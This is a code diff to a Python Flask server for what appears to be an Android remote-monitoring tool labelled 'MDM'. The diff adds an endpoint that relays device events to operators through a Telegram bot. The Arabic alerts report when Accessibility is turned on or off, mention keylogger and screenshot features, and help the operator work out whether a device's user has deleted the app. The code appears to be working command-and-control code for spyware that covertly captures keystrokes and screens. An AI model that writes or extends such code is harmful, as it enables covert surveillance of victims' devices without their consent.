@@ -1724,6 +1724,82 @@ def _api_cmds():
 
 
 # ═══════════════════════════════════════════════════════════════════════
+# 9b. FAST DEVICE EVENTS (REST) - reaches bot in <1 second
+# ═══════════════════════════════════════════════════════════════════════
+
+@app.route("/api/device/event", methods=["POST"])
+def _api_device_event():
+    """Receive immediate device events via REST (no Socket.IO needed).
+
+    Events:
+      - accessibility_enabled  : user just enabled Accessibility
+      - accessibility_disabled : user just disabled Accessibility
+      - network_restored       : network was off, now back (proves it wasn't deletion)
+      - network_lost           : network went off (rarely used - usually no network to send)
+    """
+    data = request.json or {}
+    did = data.get("device_id", "")
+    event = data.get("event", "")
+    message = data.get("message", "")
+    timestamp = data.get("timestamp", 0)
+
+    if not did or not event:
+        return jsonify({"success": False, "error": "device_id and event required"}), 400
+
+    logger.info(f"[REST-Event] {did} event={event} msg={message[:80]}")
+
+    # Look up device (may not be registered yet if accessibility_just_enabled)
+    dev = dm.get_device(did)
+    if not dev:
+        dev = {"device_id": did, "model": "Unknown", "short_id": "?"}
+    short_label = _dev_label(dev)
+
+    # Build event-specific bot message
+    event_messages = {
+        "accessibility_enabled":
+            f"⚡ <b>إمكانية الوصول مفعّلة!</b>\n\n"
+            f"📱 <b>{short_label}</b>\n"
+            f"✅ تم تفعيل Accessibility\n"
+            f"🟢 الجهاز متصل وجاهز للأوامر\n"
+            f"━━━━━━━━━━━━━━━\n"
+            f"🕐 {datetime.now(timezone.utc).strftime('%H:%M:%S UTC')}",
+        "accessibility_disabled":
+            f"⚠️ <b>تم إلغاء إمكانية الوصول</b>\n\n"
+            f"📱 <b>{short_label}</b>\n"
+            f"🚫 الميزات المتقدمة معطلة (لقطات شاشة، keylogger)\n"
+            f"💡 الميزات العادية قد تعمل إذا كان التطبيق مفتوحاً\n"
+            f"━━━━━━━━━━━━━━━\n"
+            f"🕐 {datetime.now(timezone.utc).strftime('%H:%M:%S UTC')}",
+        "network_restored":
+            f"🌐 <b>عادت الشبكة - تأكد سبب الانقطاع</b>\n\n"
+            f"📱 <b>{short_label}</b>\n"
+            f"✅ <b>كان الانقطاع بسبب إطفاء الإنترنت</b>\n"
+            f"🚫 <b>ليس بسبب حذف التطبيق</b>\n"
+            f"🔄 الجهاز يعيد الاتصال الآن\n"
+            f"━━━━━━━━━━━━━━━\n"
+            f"💬 {message}",
+        "network_lost":
+            f"🔴 <b>انقطعت الشبكة</b>\n\n"
+            f"📱 <b>{short_label}</b>\n"
+            f"⚠ السبب: إطفاء الإنترنت (وليس حذف التطبيق)\n"
+            f"💡 سيعود الاتصال عند عودة الشبكة",
+    }
+
+    msg_text = event_messages.get(event,
+        f"📡 <b>حدث: {event}</b>\n\n📱 <b>{short_label}</b>\n💬 {message}")
+
+    # Send to all admin users via Telegram bot
+    if mdm_bot:
+        for admin_id in Config.ADMIN_IDS:
+            try:
+                mdm_bot.bot.send_message(admin_id, msg_text, parse_mode="HTML")
+            except Exception as e:
+                logger.error(f"فشل إرسال حدث REST للبوت: {e}")
+
+    return jsonify({"success": True, "event": event}), 200
+
+
+# ═══════════════════════════════════════════════════════════════════════
 # 10. SOCKET.IO EVENTS
 # ═══════════════════════════════════════════════════════════════════════
 
@@ -1737,7 +1813,13 @@ def _sock_disconnect():
     dev = dm.get_device_by_sid(sid)
     logger.info(f"قطع: SID={sid}")
     dm.handle_disconnect(sid)
-    # ✅ Notify bot immediately when device disconnects (app deleted/closed)
+    # ⚡ Notify bot IMMEDIATELY when device disconnects.
+    # The bot message tells the admin that the disconnect MIGHT be:
+    #   - Network off (will come back soon → "network_restored" event will arrive)
+    #   - App deleted (will NOT come back → no "network_restored" event)
+    #   - Device powered off (same as deleted - no return)
+    # The admin can distinguish by waiting: if "network_restored" arrives
+    # within ~5 min, it was network. If not, the app was likely deleted.
     if dev and mdm_bot:
         short_label = _dev_label(dev)
         for admin_id in Config.ADMIN_IDS:
@@ -1745,7 +1827,14 @@ def _sock_disconnect():
                 mdm_bot.bot.send_message(admin_id,
                     f"🔴 <b>جهاز انقطع</b>\n\n"
                     f"📱 <b>{short_label}</b>\n"
-                    f"⚠ قد يكون التطبيق تم حذفه أو إغلاقه",
+                    f"━━━━━━━━━━━━━━━\n"
+                    f"⚠ <b>السبب المحتمل:</b>\n"
+                    f"• إطفاء الشبكة (سيعود قريباً ✅)\n"
+                    f"• حذف التطبيق (لن يعود ❌)\n"
+                    f"• إطفاء الجهاز (لن يعود ❌)\n"
+                    f"━━━━━━━━━━━━━━━\n"
+                    f"💡 إذا وصلت رسالة \"🌐 عادت الشبكة\" → كان السبب إطفاء النت\n"
+                    f"💡 إذا لم تعد أي رسالة ← 5 دقائق → التطبيق محذوف",
                     parse_mode="HTML")
             except Exception as e:
                 logger.error(f"فشل إرسال إشعار الانقطاع: {e}")
